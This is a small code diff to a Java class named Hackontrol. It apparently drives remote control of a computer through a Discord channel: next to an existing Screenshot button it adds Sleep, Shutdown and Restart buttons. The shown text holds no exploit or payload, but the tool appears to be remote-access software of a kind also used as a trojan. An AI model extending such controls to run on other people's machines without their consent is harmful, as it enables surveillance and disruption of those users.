@@ -57,6 +57,7 @@ public class Hackontrol {
 
 		if(messageList.isEmpty()) {
 			controlChannel.sendMessage("**Screen Control**").addActionRow(Button.success("screenshot", "Screenshot")).complete();
+			controlChannel.sendMessage("**Power Control**").addActionRow(Button.success("sleep", "Sleep"), Button.danger("shutdown", "Shutdown"), Button.primary("restart", "Restart")).complete();
 		}
 
 		/*Category category = this.guild.createCategory(identifier).complete();
